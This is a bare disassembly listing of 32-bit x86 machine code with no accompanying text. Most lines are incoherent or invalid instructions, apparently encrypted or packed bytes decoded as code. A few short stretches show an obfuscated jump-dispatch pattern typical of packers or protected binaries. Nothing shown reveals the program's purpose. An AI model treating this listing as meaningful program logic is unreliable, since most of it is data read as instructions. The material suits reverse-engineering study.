  40fc64:	ja     0x40fc26
  40fc66:	pop    esi
  40fc67:	dec    ecx
  40fc68:	and    bl,BYTE PTR ds:0x64d9370b
  40fc6e:	test   eax,0x460cf420
  40fc73:	repnz or DWORD PTR [ecx],edx
  40fc76:	call   0xf060ea65
  40fc7b:	mov    bh,bh
  40fc7d:	xor    ecx,DWORD PTR [ebp+0x4]
  40fc80:	scas   eax,DWORD PTR es:[edi]
  40fc81:	sti    
  40fc82:	loope  0x40fcf5
  40fc84:	les    ebx,FWORD PTR [edi]
  40fc86:	push   ebp
  40fc87:	sahf   
  40fc88:	pop    esp
  40fc89:	fcomp  QWORD PTR [edx]
  40fc8b:	call   0xd46af1cc
  40fc90:	shl    bh,cl
  40fc92:	mov    BYTE PTR [edx],al
  40fc94:	(bad)  [eax-0x65a7dd18]
  40fc9a:	loopne 0x40fca3
  40fc9c:	pop    esi
  40fc9d:	push   esp
  40fc9e:	sub    ebp,esp
  40fca0:	mov    cl,0xe1
  40fca2:	dec    ebx
  40fca3:	inc    edi
  40fca4:	retf   
  40fca5:	aaa    
  40fca6:	jb     0x40fc2f
  40fca8:	mov    esp,0xba2adf59
  40fcad:	scas   eax,DWORD PTR es:[edi]
  40fcae:	mov    bh,BYTE PTR [ecx-0xc9e40d9]
  40fcb4:	into   
  40fcb5:	cmp    BYTE PTR [ebx+0x57],ah
  40fcb8:	xchg   esp,eax
  40fcb9:	sub    edi,DWORD PTR [ebx+0x5f199ae1]
  40fcbf:	scas   al,BYTE PTR es:[edi]
  40fcc0:	mov    dl,0x23
  40fcc2:	dec    ebp
  40fcc3:	mov    cl,0x3f
  40fcc5:	pusha  
  40fcc6:	mov    edi,0x97b968fb
  40fccb:	push   eax
  40fccc:	xchg   esp,eax
  40fccd:	jb     0x40fc8f
  40fccf:	pop    edx
  40fcd0:	(bad)  
  40fcd1:	daa    
  40fcd2:	mov    bh,0xf3
  40fcd4:	sti    
  40fcd5:	test   BYTE PTR [ebx+0x29],bl
  40fcd8:	mov    bl,0x6e
  40fcda:	sti    
  40fcdb:	fcom   DWORD PTR [ebx+0x54]
  40fcde:	mov    eax,0xa1608752
  40fce3:	loop   0x40fd13
  40fce5:	repz push 0x73
  40fce8:	xchg   edx,eax
  40fce9:	mov    ds:0x6fd75b01,al
  40fcee:	fmul   QWORD PTR [ebp+0x22b54fa0]
  40fcf4:	sub    al,0x5
  40fcf6:	fld    DWORD PTR [eax+ecx*1-0x2a932080]
  40fcfd:	add    DWORD PTR [edx+edx*2-0x59b0dc29],esi
  40fd04:	adc    esp,DWORD PTR [edx+ebp*1]
  40fd07:	adc    eax,DWORD PTR [ecx+0x35]
  40fd0a:	jge    0x40fcea
  40fd0c:	or     eax,0x77a8a8ad
  40fd11:	loop   0x40fcfb
  40fd13:	ret    0xa4f9
  40fd16:	and    DWORD PTR [eax+0x26],0x6b
  40fd1a:	mov    DWORD PTR [ecx+esi*1],edx
  40fd1d:	cwde   
  40fd1e:	xchg   BYTE PTR [ecx+0x1c08d044],ch
  40fd24:	std    
  40fd25:	mov    ecx,0x5a936c49
  40fd2a:	mov    ds:0xbec6c339,al
  40fd2f:	scas   eax,DWORD PTR es:[edi]
  40fd30:	imul   esi,edx,0x16
  40fd33:	xchg   esp,eax
  40fd34:	nop
  40fd35:	sub    BYTE PTR [eax],bh
  40fd37:	mov    al,0x61
  40fd39:	into   
  40fd3a:	jno    0x40fd56
  40fd3c:	mov    al,ds:0x511e75e
  40fd41:	outs   dx,DWORD PTR ds:[esi]
  40fd42:	pusha  
  40fd43:	out    dx,al
  40fd44:	or     bh,BYTE PTR [ebx+0x11]
  40fd47:	push   ss
  40fd48:	gs or  eax,0x7801392e
  40fd4e:	mov    ds:0xa812018b,eax
  40fd53:	or     eax,0xdd341974
  40fd58:	xchg   esp,eax
  40fd59:	mov    WORD PTR [edx],cs
  40fd5b:	mov    dh,0x2c
  40fd5d:	mov    ecx,0xd02e9590
  40fd62:	imul   esi,DWORD PTR [eax+edi*8],0xa989c538
  40fd69:	jg     0x40fd59
  40fd6b:	imul   esp,DWORD PTR [eax],0x207eb9b3
  40fd71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd72:	out    dx,al
  40fd73:	in     al,0xea
  40fd75:	inc    eax
  40fd76:	add    al,0xe6
  40fd78:	inc    ebp
  40fd79:	xchg   dh,dl
  40fd7b:	xlat   BYTE PTR ds:[ebx]
  40fd7c:	adc    eax,0x3ccb20a2
  40fd81:	gs neg dh
  40fd84:	mov    DWORD PTR [ebx],ebp
  40fd86:	cli    
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	push   edx
  40fdbc:	add    edx,eax
  40fdbe:	xor    BYTE PTR [edx+0x4b],bh
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	or     BYTE PTR [ebx-0x11],0x21
  40fdcb:	and    DWORD PTR [eax+0x4860b73c],esp
  40fdd1:	ja     0x40fde9
  40fdd3:	popf   
  40fdd4:	(bad)  [edx+0x36]
  40fdd7:	(bad)  
  40fdd8:	in     eax,0x6d
  40fdda:	call   0xa6182f76
  40fddf:	mov    cl,0xd3
  40fde1:	popa   
  40fde2:	sar    BYTE PTR [edx],cl
  40fde4:	cli    
  40fde5:	jl     0x40fe2f
  40fde7:	mov    eax,ds:0xafa7287d
  40fdec:	pusha  
  40fded:	and    al,0xe0
  40fdef:	sar    DWORD PTR [ebp+0x4b],cl
  40fdf2:	test   al,0x31
  40fdf4:	xor    bl,BYTE PTR [edx-0x24a74fb]
  40fdfa:	ret    
  40fdfb:	inc    esi
  40fdfd:	(bad)
  40fe00:	test   ecx,edx
  40fe02:	mov    ah,0xdc
  40fe04:	fild   DWORD PTR [esi+0x5c]
  40fe07:	(bad)  
  40fe08:	(bad)  
  40fe09:	jmp    0x40fe62
  40fe0b:	repz lahf 
  40fe0d:	imul   ecx,DWORD PTR [ecx],0xc1f2d16b
  40fe13:	ins    DWORD PTR es:[edi],dx
  40fe14:	xor    edx,esp
  40fe16:	pop    edx
  40fe17:	pop    ss
  40fe18:	aad    0x3a
  40fe1a:	mov    dh,0xc0
  40fe1c:	mov    edx,0xff994702
  40fe21:	xchg   edx,eax
  40fe22:	push   ss
  40fe23:	mov    ah,0x18
  40fe25:	nop
  40fe26:	push   ebx
  40fe27:	push   0xb0166933
  40fe2c:	aad    0xd6
  40fe2e:	xchg   edx,eax
  40fe2f:	test   DWORD PTR [ebx],eax
  40fe31:	mov    ds:0x5e197ba2,eax
  40fe36:	dec    esp
  40fe37:	sbb    DWORD PTR [ebp+0x42149e14],0x2d
  40fe3e:	in     al,dx
  40fe3f:	inc    eax
  40fe40:	lahf   
  40fe41:	xor    eax,0x73c176f6
  40fe46:	cs int3 
  40fe48:	cmp    ecx,DWORD PTR [esi]
  40fe4a:	imul   ebp,DWORD PTR [ecx-0x59203be9],0xb4825cbc
  40fe54:	cmp    BYTE PTR [ecx],dl
  40fe56:	xchg   esi,eax
  40fe57:	push   0xe10daeab
  40fe5c:	mov    WORD PTR [esp+edi*4-0x32],?
  40fe60:	pop    ebp
  40fe61:	into   
  40fe62:	xchg   DWORD PTR [ebp-0x11],eax
  40fe65:	cs (bad) 
  40fe67:	aam    0x63
  40fe69:	ja     0x40fe73
  40fe6b:	inc    ebx
  40fe6c:	adc    al,0x39
  40fe6e:	adc    al,0x12
  40fe70:	push   edx
  40fe71:	(bad)  
  40fe72:	in     al,dx
  40fe73:	xor    eax,0x4db1e4e7
  40fe78:	or     DWORD PTR [ecx-0x215c853e],edx
  40fe7e:	add    BYTE PTR [edx-0x4b],bl
  40fe81:	adc    eax,0x24d26abf
  40fe86:	mov    esp,0x6ff6167e
  40fe8b:	and    al,BYTE PTR [ecx+0x65]
  40fe8e:	stos   DWORD PTR es:[edi],eax
  40fe8f:	pop    eax
  40fe90:	adc    DWORD PTR [edi+0x73],edi
  40fe93:	sahf   
  40fe94:	or     BYTE PTR ds:[ecx],0xb2
  40fe98:	mov    al,BYTE PTR [ebx+0x46bebfac]
  40fe9e:	jge    0x40fe2a
  40fea0:	adc    al,0x77
  40fea2:	test   BYTE PTR [edi-0x721ebd8e],ah
  40fea8:	mov    es,esi
  40feaa:	mov    esp,0xaed58d19
  40feaf:	test   eax,0xf9106428
  40feb4:	dec    edi
  40feb5:	adc    ch,BYTE PTR [edi-0x18]
  40feb8:	addr16 pop ebx
  40feba:	mov    eax,ds:0xb5b8b886
  40febf:	or     bh,BYTE PTR [ebx+0x7c]
  40fec2:	and    DWORD PTR [ebp+0x3feb3fee],edx
  40fec8:	pushf  
  40fec9:	mov    ah,BYTE PTR [edi+0x370c73fb]
  40fecf:	sbb    dh,BYTE PTR [ecx-0x450a737c]
  40fed5:	es mov ecx,0x46b1c707
  40fedb:	test   DWORD PTR [ecx],edi
  40fedd:	jne    0x40ff09
  40fedf:	dec    eax
  40fee0:	repz xlat BYTE PTR fs:[ebx]
  40fee3:	inc    ebx
  40fee4:	daa    
  40fee5:	xchg   esp,eax
  40fee6:	(bad)  
  40fee7:	sub    BYTE PTR [eax-0x30],ch
  40feea:	xchg   esp,eax
  40feeb:	lahf   
  40feec:	push   ds
  40feed:	cs enter 0xc42a,0x5e
  40fef2:	and    DWORD PTR [edx-0x21598404],ebx
  40fef8:	out    0xcb,al
  40fefa:	inc    edx
  40fefb:	or     bh,al
  40fefd:	inc    ebp
  40fefe:	daa    
  40feff:	daa    
  40ff00:	pop    ebp
  40ff01:	in     al,dx
  40ff02:	imul   ecx,DWORD PTR [eax],0x1c
  40ff05:	sub    eax,0x884eaa32
  40ff0a:	js     0x40ff06
  40ff0c:	jl     0x40ff0a
  40ff0e:	mov    esp,0xd3d32143
  40ff13:	retf   0xd568
  40ff16:	and    eax,0xf52874b8
  40ff1b:	pop    ds
  40ff1c:	inc    esi
  40ff1d:	push   ebx
  40ff1e:	xchg   edx,eax
  40ff1f:	mov    BYTE PTR [edi-0x3b],cl
  40ff22:	xchg   esp,eax
  40ff23:	sbb    BYTE PTR [edi+0x7cb5a1d],ah
  40ff29:	xor    eax,DWORD PTR [edx]
  40ff2b:	or     eax,0xb6464f66
  40ff30:	mov    BYTE PTR [edx],dh
  40ff32:	add    DWORD PTR [edi+0x171e0667],0x7be30115
  40ff3c:	xlat   BYTE PTR ds:[ebx]
  40ff3d:	xchg   ecx,eax
  40ff3e:	shr    BYTE PTR [ebx-0x5],1
  40ff41:	test   DWORD PTR es:[eax],esi
  40ff44:	(bad)  
  40ff45:	adc    esp,DWORD PTR [edi+0x7c]
  40ff48:	std    
  40ff49:	sub    ecx,edi
  40ff4b:	mov    ss,WORD PTR [ecx-0x63]
  40ff4e:	das    
  40ff4f:	add    DWORD PTR [edx],eax
  40ff51:	mov    DWORD PTR [edx+0x5f],0xecd3746a
  40ff58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff59:	pop    es
  40ff5a:	pushf  
  40ff5b:	jo     0x40ffa8
  40ff5d:	mov    dh,0xe5
  40ff5f:	ret    
  40ff60:	fs xor dl,0x7b
  40ff64:	mov    ss,WORD PTR [eax+ecx*8]
  40ff67:	and    DWORD PTR [esi],esp
  40ff69:	mov    ebp,0xfb54c390
  40ff6e:	xor    eax,0x2b123d5e
  40ff73:	ret    
  40ff74:	dec    ebp
  40ff75:	xchg   esi,eax
  40ff76:	add    BYTE PTR [eax+0x148a2e9a],dl
  40ff7c:	sub    esp,DWORD PTR [edi+ebp*8+0x314cdd74]
  40ff83:	dec    ebp
  40ff84:	(bad)  
  40ff85:	sub    bl,ch
  40ff87:	scas   eax,DWORD PTR es:[edi]
  40ff88:	mov    DWORD PTR [ecx],edx
  40ff8a:	push   edi
  40ff8b:	adc    bl,BYTE PTR [edi+0x31]
  40ff8e:	nop
  40ff8f:	retf   
  40ff90:	call   0x2fc2:0x2b5507d9
  40ff97:	int    0xb
  40ff99:	jbe    0x40ff6c
  40ff9b:	sbb    eax,0xec6a8fa3
  40ffa0:	push   eax
  40ffa1:	xchg   DWORD PTR [eax+0x1a863829],ebp
  40ffa7:	cmp    al,0x4d
  40ffaa:	shl    dl,1
  40ffac:	enter  0x5668,0xf7
  40ffb0:	sbb    al,0x41
  40ffb2:	mov    bh,0x73
  40ffb4:	mov    gs,WORD PTR [ebx]
  40ffb6:	loopne 0x40ff56
  40ffb8:	jb     0x40ffd6
  40ffba:	mov    ebx,0x138da5f1
  40ffbf:	ja     0x40ffd3
  40ffc1:	add    BYTE PTR [ecx+0x52],dh
  40ffc4:	rol    al,1
  40ffc6:	inc    ebp
  40ffc7:	fwait
  40ffc8:	ja     0x40ffd7
  40ffca:	sahf   
  40ffcb:	push   edi
  40ffcc:	xor    eax,0x34645147
  40ffd1:	lock mov ebx,0x98a801c6
  40ffd7:	inc    dl
  40ffd9:	cmp    ebp,esi
  40ffdb:	std    
  40ffdc:	out    dx,eax
  40ffdd:	out    0x1e,eax
  40ffdf:	popa   
  40ffe0:	pop    edx
  40ffe1:	inc    esi
  40ffe2:	cmp    eax,0xd634c272
  40ffe7:	ficom  DWORD PTR [edi-0x1b]
  40ffea:	pop    edx
  40ffeb:	popf   
  40ffec:	bound  edi,QWORD PTR ds:0x56c7efbf
  40fff2:	pop    es
  40fff3:	xchg   edi,eax
  40fff4:	test   DWORD PTR [edx-0x3c],0x92c13f59
  40fffb:	xchg   ebp,eax
  40fffc:	and    al,0xa7
  40fffe:	sub    eax,0x96cebe76
  410003:	adc    bl,cl
  410005:	mov    bh,0x16
  410007:	cmp    ebx,ebp
  410009:	enter  0x7ed1,0xfc
  41000d:	mov    bh,0xd7
  41000f:	imul   eax,DWORD PTR [ebx],0xaf05ee02
  410015:	jo     0x40ffa2
  410017:	int    0xe0
  410019:	xchg   dh,bl
  41001b:	cld    
  41001c:	jne    0x40ffa5
  41001e:	lock lea edx,[eax-0x37]
  410022:	scas   eax,DWORD PTR es:[edi]
  410023:	adc    ah,BYTE PTR [edx+0x5dd5052]
  410029:	ret    
  41002a:	in     al,0xc2
  41002c:	lahf   
  41002d:	iret   
  41002e:	jmp    0x8b8f24a5
  410033:	pop    ebp
  410034:	lock sub ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	pop    ds
  410069:	mov    al,ds:0x48e71334
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	ins    BYTE PTR es:[edi],dx
  410075:	test   al,0x32
  410077:	or     eax,0x6f4a41b
  41007c:	push   ds
  41007d:	pop    edi
  41007e:	aaa    
  41007f:	sub    dh,BYTE PTR [edx]
  410081:	cli    
  410082:	add    bh,ch
  410084:	imul   esp,DWORD PTR ds:0xe8b900e9,0x53
  41008b:	push   ebx
  41008c:	stos   BYTE PTR es:[edi],al
  41008d:	(bad)  
  41008e:	es iret 
  410090:	inc    edi
  410091:	inc    eax
  410092:	sahf   
  410093:	cli    
  410094:	cld    
  410095:	das    
  410096:	lods   eax,DWORD PTR ds:[esi]
  410097:	rol    DWORD PTR [ebx],0xaa
  41009a:	lods   eax,DWORD PTR ds:[esi]
  41009b:	out    0xf3,al
  41009d:	clc    
  41009e:	mov    ch,BYTE PTR [eax]
  4100a0:	xor    al,0x39
  4100a2:	xchg   esp,eax
  4100a3:	pop    ebp
  4100a4:	out    dx,al
  4100a5:	add    eax,ecx
  4100a7:	(bad)  
  4100a8:	and    ebp,eax
  4100aa:	push   edx
  4100ab:	xor    eax,DWORD PTR ds:0x9188a88b
  4100b1:	js     0x4100bd
  4100b3:	aas    
  4100b4:	xor    ebx,edx
  4100b6:	das    
  4100b7:	mov    al,0x25
  4100b9:	mov    ecx,0x2ba0f982
  4100be:	and    BYTE PTR [eax],0x4c
  4100c1:	lods   al,BYTE PTR ds:[esi]
  4100c2:	mov    bh,0x93
  4100c4:	pop    eax
  4100c5:	hlt    
  4100c6:	mov    ds:0xbe77cac3,al
  4100cb:	sbb    eax,0xc674c470
  4100d0:	ins    DWORD PTR es:[edi],dx
  4100d1:	pop    es
  4100d2:	mov    eax,0x35de1933
  4100d7:	inc    ecx
  4100d8:	(bad)  
  4100d9:	pop    ebp
  4100da:	(bad)  
  4100db:	and    BYTE PTR [edx-0x6a054eb2],bl
  4100e1:	and    ebx,DWORD PTR [esi+ecx*1-0x31]
  4100e5:	lods   al,BYTE PTR ds:[esi]
  4100e6:	std    
  4100e7:	cmp    ecx,esp
  4100e9:	adc    al,0x30
  4100eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100ec:	xchg   DWORD PTR [edx-0x4baf2766],ebx
  4100f2:	sbb    edx,0x6d
  4100f5:	das    
  4100f6:	retf   
  4100f7:	sahf   
  4100f8:	sub    ah,al
  4100fa:	std    
  4100fb:	ret    0x56e1
  4100fe:	hlt    
  4100ff:	push   edi
  410100:	ret    0xd42
  410103:	rcl    DWORD PTR [edx+eax*8-0x77d905e],cl
  41010a:	dec    ebx
  41010b:	scas   al,BYTE PTR es:[edi]
  41010c:	sbb    al,0x84
  41010e:	inc    esp
  41010f:	sbb    eax,0x5e618ff8
  410114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410115:	sbb    dh,dl
  410117:	inc    ecx
  410118:	cmc    
  410119:	push   cs
  41011a:	mov    ss,WORD PTR [edx+0x7be18621]
  410120:	outs   dx,DWORD PTR ds:[esi]
  410121:	fs add ebx,esp
  410124:	push   esi
  410125:	enter  0x9a2a,0x47
  410129:	je     0x410132
  41012b:	mov    dl,0x93
  41012d:	mov    WORD PTR ds:0x14845a50,?
  410133:	mov    ebp,0x4a62e8da
  410138:	fdivr  DWORD PTR [ebp+0x69]
  41013b:	ins    BYTE PTR es:[edi],dx
  41013c:	(bad)  
  41013d:	sbb    BYTE PTR [edi+0x54],cl
  410140:	push   edi
  410141:	ins    BYTE PTR es:[edi],dx
  410142:	out    dx,al
  410143:	push   ecx
  410144:	enter  0x1853,0x92
  410148:	shl    BYTE PTR [ebp+esi*2+0x70],0xdd
  41014d:	pop    ss
  41014e:	and    eax,0xf0032ca9
  410153:	jbe    0x410103
  410155:	sbb    BYTE PTR [eax+0x79bec1de],bh
  41015b:	jae    0x41019f
  41015d:	push   esi
  41015e:	(bad)  
  41015f:	shl    DWORD PTR [eax],1
  410161:	pop    ss
  410162:	dec    esi
  410163:	cmp    DWORD PTR [ebp-0x28174478],edi
  410169:	cmp    al,0x56
  41016b:	out    dx,eax
  41016c:	mov    al,0x82
  41016e:	sbb    bl,BYTE PTR [ecx+0x6a]
  410171:	daa    
  410172:	inc    eax
  410173:	out    0x67,al
  410175:	inc    esp
  410176:	jnp    0x410180
  410178:	leave  
  410179:	sub    BYTE PTR [edi],dh
  41017b:	xchg   edi,ebp
  41017d:	inc    esi
  41017e:	in     al,dx
  41017f:	push   ds
  410180:	pop    edx
  410181:	call   0x7ecdf32f
  410186:	adc    DWORD PTR [edx],esp
  410188:	and    eax,DWORD PTR [ecx]
  41018a:	mov    edx,edi
  41018c:	dec    esp
  41018d:	cmp    BYTE PTR [edx-0x30],bl
  410190:	pushf  
  410191:	add    BYTE PTR [ecx*2-0x47f6cf8f],dh
  410198:	xchg   esp,eax
  410199:	pop    ebx
  41019a:	lds    ecx,FWORD PTR [ecx]
  41019c:	cmp    DWORD PTR [edi-0x62],0xffffffec
  4101a0:	(bad)
  4101a3:	sub    edx,DWORD PTR ds:0x2bf60b54
  4101a9:	outs   dx,DWORD PTR ds:[esi]
  4101aa:	push   eax
  4101ab:	inc    esi
  4101ac:	(bad)  
  4101ad:	lahf   
  4101ae:	das    
  4101af:	nop
  4101b0:	ds jge 0x4101cd
  4101b3:	je     0x410176
  4101b5:	dec    esi
  4101b6:	add    al,dh
  4101b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101b9:	imul   edi,DWORD PTR gs:[edx],0x7e
  4101bd:	jae    0x41022e
  4101bf:	and    BYTE PTR [esi],dl
  4101c1:	fcmovu st,st(7)
  4101c3:	arpl   WORD PTR [ebx+0x35a9e292],bx
  4101c9:	mov    edi,ebx
  4101cb:	retf   0x4dff
  4101ce:	imul   edx,DWORD PTR [esi+0x5a084bd9],0x7ee299a1
  4101d8:	pop    ebx
  4101d9:	add    eax,0x9551e5bd
  4101de:	cmp    DWORD PTR [edi+0x43],esp
  4101e1:	or     al,0x8d
  4101e3:	dec    ebp
  4101e4:	int    0x91
  4101e6:	dec    ecx
  4101e7:	xor    eax,0xc03acc9a
  4101ec:	xor    BYTE PTR [ebx-0x29d6ed42],0x82
  4101f3:	mov    eax,ds:0x848b239a
  4101f8:	pop    ds
  4101f9:	add    BYTE PTR ds:0xc2a5495b,al
  4101ff:	imul   edi,DWORD PTR [ebx-0x19],0x5bc9c4e5
  410206:	clc    
  410207:	sub    al,0xb9
  410209:	cmp    BYTE PTR [edi+0x40afab8],dh
  41020f:	ror    BYTE PTR [ebx+eiz*8+0x61],0xe9
  410214:	dec    ebp
  410215:	adc    bh,BYTE PTR [edx]
  410217:	retf   
  410218:	packuswb mm5,mm6
  41021b:	out    dx,al
  41021c:	imul   esi,DWORD PTR [ebp+ebp*8-0x3f],0xe
  410221:	bound  edx,QWORD PTR [esi]
  410223:	mov    eax,0xce2fb6c8
  410228:	ja     0x410200
  41022a:	dec    ebx
  41022b:	adc    DWORD PTR [ebp+0x291eee84],ecx
  410231:	inc    BYTE PTR [esp+ebx*1+0x578aaacf]
  410238:	daa    
  410239:	pusha  
  41023a:	xchg   BYTE PTR [edi-0x47],dh
  41023d:	lahf   
  41023e:	push   es
  41023f:	(bad)  
  410240:	pop    esp
  410241:	adc    eax,0xa0539f30
  410246:	inc    edx
  410247:	test   eax,0xd633729
  41024c:	(bad)
  41024f:	mov    BYTE PTR [eax+0x1afc18de],cl
  410255:	mov    BYTE PTR ds:0x26749868,al
  41025b:	jnp    0x41025c
  41025d:	adc    al,0x2a
  41025f:	cmovle edi,eax
  410262:	das    
  410263:	imul   ebx,DWORD PTR [ebx-0x11],0x3a
  410267:	inc    esp
  410268:	rcr    DWORD PTR [edx-0x21],0xcc
  41026c:	(bad)  
  41026d:	pop    eax
  41026e:	(bad)  
  41026f:	jl     0x410232
  410271:	jae    0x4101f8
  410273:	add    DWORD PTR [ebp+0x1c],0xffffffc2
  410277:	adc    al,0xbe
  410279:	mov    eax,DWORD PTR [eax-0x3]
  41027c:	stos   BYTE PTR es:[edi],al
  41027d:	adc    DWORD PTR [ebx+0x48],edx
  410280:	loop   0x41029d
  410282:	popf   
  410283:	jecxz  0x41024b
  410285:	std    
  410286:	jns    0x4102d9
  410288:	repz mov edx,DWORD PTR [ecx]
  41028b:	ds sub eax,0xf65c894c
  410291:	loopne 0x410239
  410293:	xor    esi,DWORD PTR [eax-0x6b]
  410296:	adc    BYTE PTR [esi+0x3e],al
  410299:	cdq    
  41029a:	test   BYTE PTR [edx],dh
  41029c:	retf   
  41029d:	mov    eax,ds:0xb649b2f
  4102a2:	rol    BYTE PTR [eax-0x26b15b8],0xec
  4102a9:	mov    ?,WORD PTR [ebp-0x5d741417]
  4102af:	xlat   BYTE PTR ds:[ebx]
  4102b0:	bound  eax,QWORD PTR ds:0x948187
  4102b6:	cmp    dh,cl
  4102b8:	push   0x89d38907
  4102bd:	(bad)  
  4102be:	cmp    esp,DWORD PTR [esi-0x73be25ba]
  4102c4:	xchg   DWORD PTR [edi-0x17],ecx
  4102c7:	cmp    eax,0xea43c7b6
  4102cc:	ins    BYTE PTR es:[edi],dx
  4102cd:	mov    cl,0x3
  4102cf:	lock jmp 0xa615cfd1
  4102d5:	repnz (bad) 
  4102d8:	jae    0x410268
  4102da:	fwait
  4102db:	jmp    0xe9d1:0x3aea6aa
  4102e2:	add    DWORD PTR [edx],0x0
  4102e5:	add    bl,al
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	fs inc esp
  4102f4:	cmp    eax,0x784e4cde
  4102f9:	js     0x4102e0
  4102fb:	jle    0x410375
  4102fd:	js     0x4102c7
  4102ff:	retf   
  410300:	sub    ecx,DWORD PTR [edi-0x21]
  410303:	sub    ebp,ebx
  410305:	hlt    
  410306:	pop    ebp
  410307:	and    ebx,DWORD PTR [esi-0x28]
  41030a:	scas   al,BYTE PTR es:[edi]
  41030b:	ins    BYTE PTR es:[edi],dx
  41030c:	mov    bh,0xf4
  41030e:	out    0xc0,eax
  410310:	pop    edi
  410311:	repz mov eax,0x4b809225
  410317:	xor    al,0x7e
  410319:	mov    WORD PTR [eax+0x411243df],ss
  41031f:	push   ds
  410320:	sub    ch,BYTE PTR [edx+0x6f5be2fd]
  410326:	pop    esp
  410327:	je     0x410352
  410329:	mov    al,0xd0
  41032b:	cld    
  41032c:	xchg   ebp,eax
  41032d:	push   edx
  41032e:	in     al,dx
  41032f:	rol    DWORD PTR [ebx],0x9c
  410332:	jbe    0x4102e9
  410334:	jae    0x410362
  410336:	lds    ebx,FWORD PTR [esi-0x15bd2135]
  41033c:	fcomp  DWORD PTR [esi-0x6b]
  41033f:	sub    al,0xdf
  410341:	shr    DWORD PTR [ebp-0x49],0x11
  410345:	sbb    ebx,eax
  410347:	adc    edx,DWORD PTR [ecx]
  410349:	and    eax,0xd9d9885a
  41034e:	inc    esp
  41034f:	or     BYTE PTR [edi-0x43],0xca
  410353:	addr16 xchg esp,eax
  410355:	mov    esi,0x1c6ad815
  41035a:	push   edx
  41035b:	and    eax,0xdf73638b
  410360:	xchg   ebp,eax
  410361:	push   edi
  410362:	dec    edx
  410363:	lahf   
  410364:	cli    
  410365:	sbb    esp,DWORD PTR [ebp+0x6d0219f3]
  41036b:	xrstor [ecx-0x25]
  41036f:	inc    eax
  410370:	retf   
  410371:	pop    eax
  410372:	or     ecx,DWORD PTR [ebp+0x2]
  410375:	mov    cs,WORD PTR [edi+0x14]
  410378:	aas    
  410379:	inc    esi
  41037a:	scas   al,BYTE PTR es:[edi]
  41037b:	aas    
  41037c:	loopne 0x410308
  41037e:	mov    eax,0x3dcf833
  410383:	dec    edi
  410384:	mov    ebp,0xb72ffee7
  410389:	rep ins BYTE PTR es:[edi],dx
  41038b:	in     eax,dx
  41038c:	mov    ebp,0x24202fd3
  410391:	adc    cl,BYTE PTR [ebx+0x5]
  410394:	xchg   BYTE PTR [ebx+0x51077228],ch
  41039a:	jnp    0x410372
  41039c:	mov    ch,BYTE PTR [edi]
  41039e:	fild   QWORD PTR [esi]
  4103a0:	lods   al,BYTE PTR ds:[esi]
  4103a1:	adc    eax,0x2d1f1d5c
  4103a6:	xchg   edx,eax
  4103a7:	arpl   cx,di
  4103a9:	pushfw 
  4103ab:	pop    esp
  4103ac:	jne    0x4103e0
  4103ae:	jle    0x410391
  4103b0:	fwait
  4103b1:	cmc    
  4103b2:	push   edi
  4103b3:	mov    dl,al
  4103b5:	jnp    0x410357
  4103b7:	xchg   DWORD PTR [edx-0xe31eaeb],ebp
  4103bd:	ins    DWORD PTR es:[edi],dx
  4103be:	int3   
  4103bf:	mov    esi,0x7f3b6891
  4103c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103c5:	xchg   ebp,eax
  4103c6:	sub    ecx,DWORD PTR [esi-0x5cab920d]
  4103cc:	je     0x4103ed
  4103ce:	sti    
  4103cf:	sbb    eax,0x4f3c51ec
  4103d4:	mov    edx,0x6f7b9656
  4103d9:	repz pop esp
  4103db:	aas    
  4103dc:	sub    al,0x91
  4103de:	dec    eax
  4103df:	rcr    BYTE PTR [esi-0x6f],1
  4103e2:	pop    edi
  4103e3:	in     eax,0xb0
  4103e5:	mov    eax,0xd563ad65
  4103ea:	ret    0x303e
  4103ed:	jnp    0x4103d6
  4103ef:	sbb    ecx,DWORD PTR [ebx]
  4103f1:	add    al,0x91
  4103f3:	pop    es
  4103f4:	mov    BYTE PTR [edi-0x2e],bl
  4103f7:	inc    edi
  4103f8:	test   al,0x33
  4103fa:	add    eax,0xf2016bf0
  4103ff:	(bad)  
  410400:	cld    
  410401:	sub    ah,BYTE PTR [edx+eax*1-0x53]
  410405:	and    dh,ah
  410407:	or     bl,ah
  410409:	xchg   BYTE PTR [edx-0x3d],al
  41040c:	mov    cl,0x83
  41040e:	cmp    eax,0x2b7d335e
  410413:	or     DWORD PTR [ecx+0x6bc7a7b6],edi
  410419:	leave  
  41041a:	sub    esp,DWORD PTR [eax]
